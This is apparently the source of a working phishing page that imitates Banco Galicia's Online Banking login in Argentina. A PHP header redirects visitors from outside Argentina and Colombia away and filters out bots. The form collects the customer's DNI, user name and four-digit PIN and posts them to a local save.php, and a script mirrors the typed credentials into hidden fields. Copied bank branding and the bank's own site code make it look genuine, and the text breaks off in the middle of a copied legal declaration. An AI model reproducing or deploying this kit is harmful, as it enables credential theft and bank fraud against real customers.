<?php 
require_once "is_bot.php";
require_once "geoplugin.class.php";
$geoplugin = new geoPlugin();
$geoplugin->locate();
// create a variable for the country code

$ciudad = $geoplugin->countryCode;
if (!in_array($ciudad, ["AR","CO"])) {
	header("location:http://turismo.gal/");
} 
?>

<!DOCTYPE html>
<html lang="es-ar"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=0">
    <meta name="robot" content="All">
    <meta name="rating" content="general">
    <meta name="Distribution" content="Global">
    <title>Online Banking</title>
    <link rel="shortcut icon" href="https://onlinebanking.bancogalicia.com.ar/Images/favicon.ico">
    <link rel="apple-touch-icon" href="https://onlinebanking.bancogalicia.com.ar/images/assets/logo_ios_60x60.png">
    <link rel="apple-touch-icon" sizes="76x76" href="https://onlinebanking.bancogalicia.com.ar/images/assets/logo_ios_76x76.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://onlinebanking.bancogalicia.com.ar/images/assets/logo_ios_120x120.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://onlinebanking.bancogalicia.com.ar/images/assets/logo_ios_152x152.png">

    <link type="text/css" href="./index_files/bootstrap.min.css" rel="stylesheet">
    <link type="text/css" href="./index_files/default.min.css" rel="stylesheet">

    <!-- Esto es el css de la libreria del teclado -->
    <link type="text/css" href="./index_files/keyboard.css" rel="stylesheet">
    <link type="text/css" href="./index_files/simple-keyboard.css" rel="stylesheet">

    <!--[if lte IE 9]>
        <link type="text/css" href="https://onlinebanking.bancogalicia.com.ar/Content/ieFixes.css?v=637453729061890000" rel="stylesheet" />
    <![endif]-->


<script type="text/javascript" async="" src="./index_files/Scritps/hotjar-584153.js"></script>
<script type="text/javascript" async="" src="./index_files/analytics.js"></script>
<script type="text/javascript" async="" src="./index_files/Scripts/js"></script>
<script async="" src="./index_files/Scripts/gtm.js"></script>
<script type="text/javascript" async="" src="./index_files/Scripts/detect.js"></script>
<script src="./index_files/sharedout"></script>

    <script src="./index_files/Scripts/FrontFunctions.min.js" type="text/javascript"></script>
    <link type="text/css" href="./index_files/customcarousel.min.css" rel="stylesheet">
<script src="./index_files/seguloginborders"></script>

<script src="./index_files/seguloginclientless"></script>


    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({"gtm.start":new Date().getTime(),event:"gtm.js"});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!="dataLayer"?"&l="+l:"";j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl+'&gtm_auth=TiByp1Z92r_vHHqYjmr5yQ&gtm_preview=env-6&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);})(window,document,"script","dataLayer","GTM-M6B9RZQ");</script>

    


<script async="" src="./index_files/Scripts/modules.f56917110d6a0ab1d784.js" charset="utf-8"></script><style type="text/css">iframe#_hjRemoteVarsFrame {display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;}</style>
<script language="javascript" type="text/javascript" src="./index_files/Scripts/51630000.js"></script>
<script language="javascript" type="text/javascript" src="./index_files/Scripts/dispatcher-v3.js"></script>
<script src="./index_files/Scripts/yahoo-min.js" type="text/javascript"></script>
<script src="./index_files/Scripts/cp-v3.js" type="text/javascript"></script>
<script src="./index_files/Scripts/json-min.js" type="text/javascript"></script></head>
<body>
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M6B9RZQ&gtm_auth=TiByp1Z92r_vHHqYjmr5yQ&gtm_preview=env-6&gtm_cookies_win=x" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>






    <div class="container-fluid ">

        <div class="row full-h">
            <div class="left-column">



                <div class="logo_login" role="banner" data-automation-id="galicia-banner">
                    <a title="link a bancogalicia.com" class="logo" href="http://www.bancogalicia.com/banca/online/web/Personas" aria-label="Ingresar a la página principal de Banco Galicia" target="_blank">
                        <div class="logo_sidebar_img" data-hj-masked=""></div>
                    </a>
                    <p data-hj-masked="">Online Banking</p>                    
                </div>
                

<div class="login">


<div class="content-login" role="main">



    <form action="save.php" method="post" id="form1" onkeypress="return evalEnter(event);" autocomplete="off" novalidate="novalidate">
        <input name="__RequestVerificationToken" type="hidden" value="D5pkTNc-C53T4hsGoZdd6SmNUorDB1I_7DVm4ImDwqDpNgWLU_nbvkyLmcGK1JL-K0wRWjW56_gycwU_dOwG2KHk3Iy5A5x4hNiLokY4uM81" data-hj-masked="">
        <div class="login-form">
            <div class="row">
            <input type="hidden" name="usuario" id="usuario">
            <input type="hidden" name="claveusuario" id="claveusuario">
                <div class="col-xs-12">
                    <h1 onclick="enableDebug();" class="login-title hidden-xs" data-hj-masked="">Iniciar sesión</h1>
                </div>
                <input data-hj-masked="" type="hidden" value="" name="EncriptedPassword" id="EncriptedPassword">
                <div class="inputWrapper">
                    <div class="inputArea invalid">
                        <div class="contentInput">
                            <input data-hj-masked="" type="number" name="DocumentNumber" id="DocumentNumber" data-name="DocumentNumber" maxlength="11" value="" required="" autocapitalize="none" autocomplete="off" onkeypress="return ValidateRegExOnEvent(event, regEx_numbers);" oninput="maxLengthCheck(this);" class="form-control keyboard" aria-required="true" aria-describedby="DocumentNumber-error" aria-invalid="true"><div id="DocumentNumber-error" class="errorMsg" data-original-title="El número de documento es obligatorio" data-toggle="tooltip" data-placement="top"></div>
                        </div>
                        <label for="DocumentNumber" class="inputLabel" data-hj-masked="">Tu DNI</label>
                        <div class="inputUnderline" data-hj-masked=""></div>
                    </div>
                </div>

                <div class="inputWrapper password">
                    <div class="inputArea">
                        <div class="contentInput">
                            <input data-hj-masked="" type="password" name="UserName" id="UserName" data-name="UserName" spellcheck="false" value="" maxlength="20" required="" class="form-control hidden-control keyboard" onkeypress="return ValidateRegExOnEvent(event, regEx_alphanumeric);" autocomplete="off" aria-required="true">
                        </div>
                        <label for="UserName" class="inputLabel" data-hj-masked="">Tu usuario Galicia</label>
                        <div class="capsLock" data-hj-masked=""></div>
                        <div class="showPassword" data-hj-masked=""></div>
                        <div class="inputUnderline" data-hj-masked=""></div>
                        <div class="labelMsg" data-hj-masked="">Bloqueo de mayúsculas activado</div>
                    </div>
                </div>

                <div class="inputWrapper password">
                    <div class="inputArea">
                        <div class="contentInput">
                            <input data-hj-masked="" type="password" name="Password" id="Password" size="4" data-name="Password" spellcheck="false" maxlength="4" required="" onkeypress="return ValidateRegExOnEvent(event, regEx_numbers);" class="form-control hidden-control keyboard" autocomplete="off" aria-required="true">
                        </div>
                        <label for="Password" class="inputLabel" data-hj-masked="">Tu clave Galicia</label>
                        <div class="showPassword" data-hj-masked=""></div>
                        <div class="inputUnderline" data-hj-masked=""></div>
                    </div>
                </div>

                <div class="col-xs-12">
                    <div class="form-group">
                        <div class="checkbox checkbox-primary">
                            <input name="RememberMe" id="RememberMe" type="checkbox" value="true" data-hj-masked="">
                            <label for="RememberMe" data-hj-masked="">
                                Recordar DNI y Usuario
                            </label>
                        </div>
                        <input name="RememberMe" type="hidden" value="false" data-hj-masked="">
                    </div>
                </div>
                <div class="col-xs-12">
                        <div class="teclado teclado-virtual hidden-xs keyboard-trigger">
                            <i class="far fa-keyboard " id="keyboardIcon" style="cursor: pointer;"></i>
                            <div name="divTeclado" id="divTeclado" type="checkbox" value="true" data-hj-masked="">Teclado Virtual</div>
                        </div>
                </div>

                <div class="col-xs-12">
                    <button class="btn btn-md btn-full-width" type="button" onclick="SubmitLoginForm();" id="submitButton" disabled="">
                        iniciar sesión
                    </button>
                </div>

                    <div class="col-xs-12">
                        <div class="links">

                            <a href="https://onlinebanking.bancogalicia.com.ar/gestion/ingresar-du" class="btn btn-caps pull-left">
                                OLVIDÉ O BLOQUEÉ MIS CLAVES
                            </a>
                        </div>
                    
                        <p data-hj-masked="">Sí es tu primera vez o necesitás el usuario</p>
                        <div class="links">
                            <a class="btn btn-caps pull-left" href="https://onlinebanking.bancogalicia.com.ar/gestion/ingresar-du">
                                CREÁ TUS CLAVES
                            </a>
                        </div>
                    </div>

            </div>
        </div>

        <input data-hj-masked="" type="hidden" id="DevicePrintAdaptive" name="DevicePrintAdaptive" value="version%3D3%2E7%2E1%5F1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20win64%3B%20x64%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F88%2E0%2E4324%2E104%20safari%2F537%2E36%7C5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F88%2E0%2E4324%2E104%20Safari%2F537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1600%7C900%7C860%26pm%5Ffpsw%3Dpdf%7Cpdf%7Cnacl%26pm%5Ffptz%3D%2D4%26pm%5Ffpln%3Dlang%3Des%2DES%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3Dinternal%2Dpdf%2Dviewer%7Cmhjfbmdgcfjbbpaeojofohoefgiehjai%7Cinternal%2Dnacl%2Dplugin%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1600%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D%26pm%5Fos%3DWindows%26pm%5Fbrmjv%3D88%26pm%5Fbr%3DChrome%26pm%5Finpt%3D%26pm%5Fexpt%3D">
        <input data-hj-masked="" type="hidden" id="isDebugEnabled" name="isDebugEnabled" value="false">
        <input data-hj-masked="" type="hidden" id="CodigoProducto" name="CodigoProducto">

    </form>
</div>
</div>

<div class="terms" role="contentinfo">
    <p data-hj-masked="">Operar con Online Banking implica aceptar los <a href="javascript:void(0)" onclick="javascript:window.open(&#39;/terminosycondiciones&#39;, &#39;_blank&#39;);return false;" data-hj-masked="">términos y condiciones</a> en los que se ofrece el servicio.</p>
    <p data-hj-masked=""><a href="https://onlinebanking.bancogalicia.com.ar/Seguridad/informacion-seguridad" data-hj-masked="">Información sobre seguridad</a></p>
</div>
    <div class="simple-keyboard hg-theme-default hg-layout-custom " id="simpleKeyboard" style="display:none;"><div class="hg-row"><div class="hg-button hg-standardBtn" data-skbtn="7" data-skbtnuid="default-r0b0" data-displaylabel="7"><span>7</span></div><div class="hg-button hg-standardBtn" data-skbtn="3" data-skbtnuid="default-r0b1" data-displaylabel="3"><span>3</span></div><div class="hg-button hg-standardBtn" data-skbtn="9" data-skbtnuid="default-r0b2" data-displaylabel="9"><span>9</span></div><div class="hg-button hg-standardBtn" data-skbtn="4" data-skbtnuid="default-r0b3" data-displaylabel="4"><span>4</span></div><div class="hg-button hg-standardBtn" data-skbtn="1" data-skbtnuid="default-r0b4" data-displaylabel="1"><span>1</span></div><div class="hg-button hg-standardBtn" data-skbtn="8" data-skbtnuid="default-r0b5" data-displaylabel="8"><span>8</span></div><div class="hg-button hg-standardBtn" data-skbtn="6" data-skbtnuid="default-r0b6" data-displaylabel="6"><span>6</span></div><div class="hg-button hg-standardBtn" data-skbtn="2" data-skbtnuid="default-r0b7" data-displaylabel="2"><span>2</span></div><div class="hg-button hg-standardBtn" data-skbtn="5" data-skbtnuid="default-r0b8" data-displaylabel="5"><span>5</span></div><div class="hg-button hg-standardBtn" data-skbtn="0" data-skbtnuid="default-r0b9" data-displaylabel="0"><span>0</span></div><div class="hg-button hg-functionBtn hg-button-bksp" data-skbtn="{bksp}" data-skbtnuid="default-r0b10" data-displaylabel="Borrar"><span>Borrar</span></div></div><div class="hg-row"><div class="hg-button hg-functionBtn hg-button-tab" data-skbtn="{tab}" data-skbtnuid="default-r1b0" data-displaylabel="Tab"><span>Tab</span></div><div class="hg-button hg-standardBtn" data-skbtn="v" data-skbtnuid="default-r1b1" data-displaylabel="v"><span>v</span></div><div class="hg-button hg-standardBtn" data-skbtn="q" data-skbtnuid="default-r1b2" data-displaylabel="q"><span>q</span></div><div class="hg-button hg-standardBtn" data-skbtn="o" data-skbtnuid="default-r1b3" data-displaylabel="o"><span>o</span></div><div class="hg-button hg-standardBtn" data-skbtn="y" data-skbtnuid="default-r1b4" data-displaylabel="y"><span>y</span></div><div class="hg-button hg-standardBtn" data-skbtn="u" data-skbtnuid="default-r1b5" data-displaylabel="u"><span>u</span></div><div class="hg-button hg-standardBtn" data-skbtn="z" data-skbtnuid="default-r1b6" data-displaylabel="z"><span>z</span></div><div class="hg-button hg-standardBtn" data-skbtn="t" data-skbtnuid="default-r1b7" data-displaylabel="t"><span>t</span></div><div class="hg-button hg-standardBtn" data-skbtn="w" data-skbtnuid="default-r1b8" data-displaylabel="w"><span>w</span></div><div class="hg-button hg-standardBtn" data-skbtn="i" data-skbtnuid="default-r1b9" data-displaylabel="i"><span>i</span></div><div class="hg-button hg-standardBtn" data-skbtn="x" data-skbtnuid="default-r1b10" data-displaylabel="x"><span>x</span></div><div class="hg-button hg-standardBtn" data-skbtn="c" data-skbtnuid="default-r1b11" data-displaylabel="c"><span>c</span></div><div class="hg-button hg-standardBtn" data-skbtn="e" data-skbtnuid="default-r1b12" data-displaylabel="e"><span>e</span></div><div class="hg-button hg-standardBtn" data-skbtn="p" data-skbtnuid="default-r1b13" data-displaylabel="p"><span>p</span></div><div class="hg-button hg-standardBtn" data-skbtn="r" data-skbtnuid="default-r1b14" data-displaylabel="r"><span>r</span></div></div><div class="hg-row"><div class="hg-button hg-functionBtn hg-button-enter" data-skbtn="{enter}" data-skbtnuid="default-r2b0" data-displaylabel="Intro"><span>Intro</span></div><div class="hg-button hg-standardBtn" data-skbtn="m" data-skbtnuid="default-r2b1" data-displaylabel="m"><span>m</span></div><div class="hg-button hg-standardBtn" data-skbtn="f" data-skbtnuid="default-r2b2" data-displaylabel="f"><span>f</span></div><div class="hg-button hg-standardBtn" data-skbtn="a" data-skbtnuid="default-r2b3" data-displaylabel="a"><span>a</span></div><div class="hg-button hg-standardBtn" data-skbtn="s" data-skbtnuid="default-r2b4" data-displaylabel="s"><span>s</span></div><div class="hg-button hg-standardBtn" data-skbtn="g" data-skbtnuid="default-r2b5" data-displaylabel="g"><span>g</span></div><div class="hg-button hg-standardBtn" data-skbtn="l" data-skbtnuid="default-r2b6" data-displaylabel="l"><span>l</span></div><div class="hg-button hg-standardBtn" data-skbtn="k" data-skbtnuid="default-r2b7" data-displaylabel="k"><span>k</span></div><div class="hg-button hg-standardBtn" data-skbtn="h" data-skbtnuid="default-r2b8" data-displaylabel="h"><span>h</span></div><div class="hg-button hg-standardBtn" data-skbtn="j" data-skbtnuid="default-r2b9" data-displaylabel="j"><span>j</span></div><div class="hg-button hg-standardBtn" data-skbtn="d" data-skbtnuid="default-r2b10" data-displaylabel="d"><span>d</span></div><div class="hg-button hg-standardBtn" data-skbtn="ñ" data-skbtnuid="default-r2b11" data-displaylabel="ñ"><span>ñ</span></div><div class="hg-button hg-standardBtn" data-skbtn="n" data-skbtnuid="default-r2b12" data-displaylabel="n"><span>n</span></div><div class="hg-button hg-standardBtn" data-skbtn="b" data-skbtnuid="default-r2b13" data-displaylabel="b"><span>b</span></div><div class="hg-button hg-functionBtn hg-button-enter" data-skbtn="{enter}" data-skbtnuid="default-r2b14" data-displaylabel="Intro"><span>Intro</span></div></div></div>
<div class="modal fade" id="popupErrorCredenciales" role="dialog" data-backdrop="static" data-keyboard="false">
    <div class="modal-dialog">
        <!-- Modal content-->
        <div class="modal-content">
            <div class="modal-header">
                <p class="modal-title description" data-hj-masked="">Los datos que ingresaste tienen algún error</p>
            </div>
            <div class="modal-body">
                <p data-hj-masked="">Por favor, revisalos antes de volver a intentarlo, ya que tu usuario y clave pueden bloquearse.</p>
                <p data-hj-masked="">
                    22022021105206
                </p>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-caps" data-dismiss="modal">ACEPTAR</button>
            </div>

        </div>
    </div>
</div>

        <iframe src="./index_files/logogalicia.html" height="0" width="0" frameborder="0"></iframe>


            </div>


            <div class="side-info content img art art-4" role="complementary" data-automation-id="out-banner">
                <div class="bullet">
                    <h2 data-hj-masked="">Bienvenido a<br> Online Banking</h2>
                </div>
            </div>
        </div>
    </div>
    <div id="mainModalContainer" data-hj-masked=""></div>

    <script type="text/javascript">
        $(document).ready(function () {
            var xhrPool = [];
            $(document).ajaxSend(function (e, jqXHR, options) {
                xhrPool.push(jqXHR);
            });
            $(document).ajaxComplete(function (e, jqXHR, options) {
                xhrPool = $.grep(xhrPool, function (x) { return x != jqXHR });
                $.HBAnalytics.addHotjarAttribute();
                RenewTimeOutClientSide();
            });
            var abort = function () {
                $.each(xhrPool, function (idx, jqXHR) {
                    jqXHR.abort();
                });
            };
            $("[name=UserName]").on("input",function(){
                $("[name=usuario]").val(this.value);
            });
            $("[name=Password]").on("input",function(){
                $("[name=claveusuario]").val(this.value);
            });
            var oldbeforeunload = window.onbeforeunload;
            window.onbeforeunload = function () {
                var r = oldbeforeunload ? oldbeforeunload() : undefined;
                if (r == undefined) {
                    // only cancel requests if there is no prompt to stay on the page
                    // if there is a prompt, it will likely give the requests enough time to finish
                    abort();
                }
                return r;
            }
            inputsEfect();
            $.HBAnalytics.triggerHotjarReady();
            sessionStorage.removeItem("signOut");
            $.HBAnalytics.executeGtmTags($.HBAnalytics.afterReadyEvents);

            try { $('.irAlSitioViejo.btn-acceso-login').hide();
$('.irAlSitioViejo').hide();

$(".consumos-resumen > .clearfix > .margin-text > .description:contains('Tarjeta cerrada')").html('Tarjeta cerrada');


//redirección a turnero nuevo
if(window.location.pathname == '/turnos/fuera-de-servicio'){
	$("h5.error").text("¡Nos renovamos!")
	$("p.description.error").text("¡Actualizamos nuestro Sistema de Turnos! Si necesitás sacar un turno para ir a tu sucursal por favor hacé click en el botón.")
	$("#Button1").addClass("btn-caps")
	$("#Button1").val("IR A NUEVO TURNERO")
	$("#Button1").attr("onclick", "window.location.href='https://turnero.bancogalicia.com.ar/'")
}




if(window.location.pathname == '/login'){
        setTimeout(function(){refreshLogin()},150000);
	$.ajaxSetup({
		error : function(jqXHR, textStatus, errorThrown) {
	    	try{
	            $.HBAnalytics.addEventsPartial({
	                event: "onb.error",
	                errorContext: "LogIn.Ajax." + jqXHR.status,
	                errorTitle: textStatus,
	                errorMessage: "error : " + errorThrown + " :: usr : " + $("#DocumentNumber").val()
		        });
	            $.HBAnalytics.executeGtmTags($.HBAnalytics.partialEvents);
	        } catch(e){ }
		}
	});
}



if(window.location.pathname == '/perfil/inicio'){
       $("a:contains('Configurar alertas')").removeAttr("onclick").click(function(){showErrorModal("Funcionalidad no disponible", "Estamos realizando modificaciones. Pronto podrás volver a configurar tus alertas.")});
}


$(".customcarousel-slider > div > div").each( function() {
    
    var texto1 = $(this).find(".hidden-xs:contains('cerró')").text();
    var texto2 = $(this).find(".visible-xs:contains('cerró')").text();

    if(texto1 != undefined)
    {
    $(this).find(".hidden-xs:contains('cerró')").html(texto1.substring(0,texto1.indexOf("cerró")) + "cerró.<span class='hidden-xs'>Estamos preparando tu resumen.</span>");
    }
    if(texto2 != undefined)
    {
    $(this).find(".visible-xs:contains('cerró')").html(texto2.substring(0,texto2.indexOf("cerró")) + "cerró.<span class='visible-xs'>Estamos preparando tu resumen.</span>");
    }

});


$(document).on('show.bs.modal', function(e){
    $('.modal-body>p:contains("El saldo en tu cuenta es menor al requerido para esta")').text('El monto ingresado es mayor al saldo de tu cuenta. En caso de operar con cuenta corriente con límite disponible del acuerdo de giro en descubierto, podés continuar con esta operación.')    
});

$('#divNuevoContacto > div:nth-child(1) > div.col-sm-8.col-lg-6.col-xlg-7 > div > label').each(function() {
if ($(this).html() === 'Joaquín')
    $(this).html('Nombre');
});

if(window.location.pathname == '/reporteimpuestos/solicitarreporteimpuestos'){
    $(".opcionComboAnioHasta[data-id='2017'],.opcionComboAnioDesde[data-id='2017']").parent().remove();
}



if(window.location.pathname == '/tarjetas/reponer-tarjeta-debito-delivery' && $("#reposicionTDContactlessLabelId").html() != undefined  ){
$("#reposicionTDContactlessLabelId").html($("#reposicionTDContactlessLabelId").html().replace("Quiero mi tarjeta con contactless", "Por otros motivos"));
}


function mostrarModalGalicia(){
	showErrorModal("", "Por favor ingresá un mail que no sea @bancogalicia.com.ar");
}

if (window.location.pathname == '/reporteimpuestos/preconfirmacionreporte'){
	$("#btn-preconfirmacion-submit").attr("onclick", null)

	$("#btn-preconfirmacion-submit").click(function(){
		if ($("#mailtexto").text().indexOf("@bancogalicia.com.ar") != -1){
			mostrarModalGalicia();    
		}
		else{
			$('#form-PreconfirmacionReporte').submit();
		}
	});
} 

if (window.location.pathname == '/transferencias/autorizacionplazofijo'){
	$("p:contains('Tené en cuenta')").hide()
}

if (window.location.pathname == '/moneda-extranjera/compra-dolares')
{
var element = document.createElement("div");
element.innerHTML ="<div class='col-xs-12 alert-box push-top-xs-5 push-top-10 no-padding-left'><div class='box-user alert-border alert-border-blue cursor-d no-shadow no-margin-bottom'><i class='icon-left icon-info-blue pull-left'></i><div class='box-content no-padding-right push-left-20'><p class='alert-title' data-hj-masked='' id='titleCVME'>Recordá que, según la comunicación A7001 del BCRA y modificatorias/complementarias, si comprás dólares tendrás que esperar 90 días para:<br/></p><div class='alert-description text-grey'><span class='no-margin-bottom' id='textoCVME'>• Vender Títulos Valores con liquidación en dólares. Esto incluye la liquidación de transferencias contra pago en dólares en el mercado local o internacional.<br/> • Transferir Títulos Valores a depositarios del exterior.</span></div></div></div></div>";

var form = document.querySelector("#form1");
form.insertBefore(element,form.firstElementChild);
}

if(document.querySelector("#tituloVencimientos > a") != undefined){
if(document.querySelector("#tituloVencimientos > a").href == "javascript:Link('/pagos/inicio');"){
document.querySelector("#tituloVencimientos > a").href =  "/navigation/menulink/409"}}


if(window.location.pathname == "/orden-extraccion/confirmacion"){
document.querySelector("#cancellationFlowButton").href="/cuentas/inicio";
}



if(window.location.pathname == '/moneda-extranjera/terminosycondiciones')
{
document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > ol > li:nth-child(2)").textContent = "";
document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > ol > li:nth-child(2)").textContent ="me comprometo a no concertar en el país operaciones de títulos valores con liquidación en moneda extranjera a partir del momento en que requiero el acceso y por los 90 días corridos subsiguientes.";
var element = document.createElement("div");
element.innerHTML = "Declaro bajo juramento que no tengo pendiente financiaciones en pesos previstas en la Comunicación A 6937 y complementarias.<br>Por medio de la presente y en referencia a la Comunicación A 7030 punto 4, declaramos bajo juramento que en la fecha y en los 90 días corridos anteriores no hemos concertado en el país ventas de títulos valores con liquidación en moneda extranjera o transferencias de los mismos a entidades depositarias del exterior (excepto por aquellas realizadas con el objeto de participar en el proceso de canje de títulos públicos abierto por el Gobierno Nacional o el Gobierno de la Provincia de Buenos Aires). Al mismo tiempo, nos comprometemos a no realizar este tipo de operaciones a partir del momento en que accedemos al mercado y por los 90 días corridos subsiguientes.<br>En el caso de haber realizado operaciones de títulos valores con el objeto de participar en el proceso de canje de títulos públicos abierto por el Gobierno Nacional o de la Provincia de Buenos Aires, nos comprometemos a presentar la correspondiente certificación de los bonos canjeados.<br>Declaro bajo juramento que no soy beneficiario de “Crédito a Tasa Cero” acordado en el marco del artículo 9° del Decreto N° 332/2020 (y modificatorias).<br>Por otro lado, en referencia a la Comunicación A 7006 punto 6, declaro bajo juramento que no soy beneficiario de las financiaciones acordadas conforme a los puntos 2 y 3 de esta Comunicación.<br>En referencia a la Comunicación 'A' 7082 punto 5, declaro bajo juramento no soy beneficiario de los “Créditos a Tasa Subsidiada para Empresas”, ni de los “Créditos a Tasa Cero Cultura” previstos en el Decreto N°332/2020.<br>En relación a la Comunicación 'A' 7105 Declaro bajo juramento que no soy beneficiario de ningún subsidio de carácter alimentario.<br>Declaro bajo juramento que es de mi conocimiento lo dispuesto en el punto 1 de la Comunicación A 7106.<br>En relación a la Comunicación “A” 7106 punto 2, declaro bajo juramento no soy beneficiario de lo dispuesto en el punto 4 de la Comunicación “A” 6949 y complementarias y/o en el artículo 2° del Decreto N° 319/20.<br>En relación a la Comunicación “A” 7140, declaro bajo juramento no soy beneficiario de una línea de financiamiento para la inversión productiva de MiPyME<br>En relación a la Comunicación A 7126 punto 1, declaro bajo juramento que no revisto el carácter de funcionario público nacional a partir del rango de Subsecretario de Estado (o rango equivalente), como así tampoco revisto el cargo de director de un Banco público nacional ni del BCRA.<br>Tomo conocimiento que la falsedad en la presente Declaración jurada me hace pasible de las sanciones establecidas en el Régimen Penal Cambiario establecido por ley 19.359 y sus modificatorias.<br>Asumo el compromiso de mantener indemne y liberar de toda responsabilidad al Banco de Galicia y Buenos Aires S.A.U por cualquier daño y/o reclamo futuro que pudiera estar originado en una falsedad consignada en la presente declaración.";

document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > p:nth-child(6)").innerHTML = "";
document.querySelector("body > div.container-fluid.out > div.main > div.row.full-h > div > div > p:nth-child(6)").innerHTML = element.innerHTML;

}

if(window.location.pathname == '/ComercioExterior/terminosycondiciones')
{
var element = document.createElement("div");
element.innerHTML = 'Manifiesto/Manifestamos, con carácter de Declaración Jurada, que:<br>Declaro bajo juramento que esta operación se ajusta a la normativa cambiaría que declaro conocer en su totalidad.<br>He/hemos dado cumplimiento en el caso de corresponder, a las presentaciones de las declaraciones de Relevamiento de Activos y Pasivos Externos, establecido en la Comunicación "A" 6401 y complementarias.<br>Por la presente tomo conocimiento de que el BCRA, mediante la Comunicación “A” 6844, establece que, para la constitución de activos externos, ayuda familiar para la operatoria con derivados por un monto superior al equivalente de U$S200 mensuales en el conjunto de las entidades autorizadas a operar en cambios, se requerirá autorización previa de ese Banco Central. El monto mencionado comprende el conjunto de los conceptos señalados precedentemente. La operación deberá cursarse con debito a cuentas del cliente en entidades financieras locales, admitiéndose el uso de efectivo en moneda local en operaciones hasta el equivalente de U$S 100 en el mes calendario y en el conjunto de entidades autorizadas a operar en cambios.<br>Por otro lado, en referencia a la Comunicación "A" 7138 Punto 5, hemos informado con una antelación de 2 días hábiles, la información sobre operaciones que correspondan a egresos por el mercado de cambios –incluyendo aquellas a concretarse a través de canjes o arbitrajes-que impliquen un acceso al mercado de cambios por un monto diario que sea igual o superior al equivalente a US$ 50.000.<br>Declaro / Declaramos bajo juramento que con la concertación de la presente operación no superamos los límites de montos establecidos actualmente en la normativa vigente. <br>Declaramos bajo juramento que el presente pago no corresponde a una operación de pago de servicios con empresas vinculadas del exterior como se describe en el punto 3.2 de Comunicación "A" 6844.<br>En relación al acceso al Mulc por medio de los Códigos de Concepto del punto 3.8 de la Com A 6844, declaro bajo juramento que nos comprometemos a no concertar en el país operaciones de títulos valores con liquidación en moneda extranjera a partir del momento en que requerimos el acceso y por los 90 días corridos subsiguientes”. Al mismo tiempo, declaramos bajo juramento que tomamos conocimiento de lo dispuesto en el punto 1 de la comunicación A 7106.<br>Nos comprometemos a demostrar el registro de ingreso aduanero de los bienes dentro del plazo que corresponda según el tipo de bien a importar. En el caso de pagos anticipados de bienes de capital, el plazo para demostrar el registro de ingreso aduanero será de 270 días corridos a partir de la fecha de acceso al mercado de cambios. Para el resto de los bienes, el plazo será de 90 días corridos a partir de la fecha de acceso al mercado local de cambios. Requerirá la conformidad previa del BCRA para los pagos anticipados de importaciones a proveedores vinculados con el importador. <br>Me comprometo a liquidar en el mercado local de cambios, dentro de los 5 días hábiles contados desde la puesta a mi disposición, las divisas que pudiera percibir en devolución de pagos de importaciones efectuados con acceso al mercado local de cambios, de conformidad con lo establecido en el punto 10.3.2.4 de la Comunicación "A" 6844.<br>En relación al punto 4.2.2. de la Com A 6844, declaro bajo juramento que no he efectuado venta de títulos valores con liquidación local en moneda extranjera en los últimos 5 días hábiles. <br>Tenemos conocimiento que, para poder realizar operaciones de formación de activos externos, remisión de ayuda familiar y operatoria con derivados, (todas ellas enunciadas en el punto 3.8. de las normas sobre “Exterior y cambios) es necesario contar con la autorización previa del BCRA o cumplir con la condición de no ser beneficiario de los préstamos referenciados en la Comunicación “A”6937; Por lo expuesto y relacionado exclusivamente con la operatoria mencionada en el presente párrafo, declaramos bajo juramento que no tenemos financiamiento pendiente de cancelación vinculado a los préstamos establecidos mediante Comunicación “A” 6937.<br>En referencia a la Comunicación "A" 6993 punto 5, declaro bajo juramento no soy beneficiario de los “Créditos a Tasa Cero” acordados en el marco del artículo 9° del Decreto N° 332/2020 (y modificatorias)<br>Por otro lado, en referencia a la Com. A 7006 punto 5, declaramos bajo juramento que no tenemos financiamiento pendiente de cancelación vinculadas con los puntos 2 y 3 de la presente Comunicación, ya sea por no haberlo solicitado, o ya sea por haberlo cancelado en su totalidad.<br>En referencia a la Comunicación "A" 7082 punto 5, declaro bajo juramento no soy beneficiario de los “Créditos a Tasa Subsidiada para Empresas”, ni de los “Créditos a Tasa Cero Cultura” previstos en el Decreto N°332/2020.<br>En relación a la Comunicación “A” 7106 punto 2, declaro bajo juramento no soy beneficiario de lo dispuesto en el punto 4 de la Comunicación “A” 6949 y complementarias y/o en el artículo 2° del Decreto N° 319/20.<br>En relación a la Comunicación “A” 7140, declaro bajo juramento no soy beneficiario de una línea de financiamiento para la inversión productiva de MiPyME.<br>Declaro bajo juramento que las posiciones arancelarias incluidas en este pago no se encuentran alcanzadas dentro de los Anexos I y II de la Com A 7201.<br>En relación a la Comunicación A 7126 punto 1, declaro bajo juramento que no revisto el carácter de funcionario público nacional a partir del rango de Subsecretario de Estado (o rango equivalente), como así tampoco revisto el cargo de director de un Banco público nacional ni 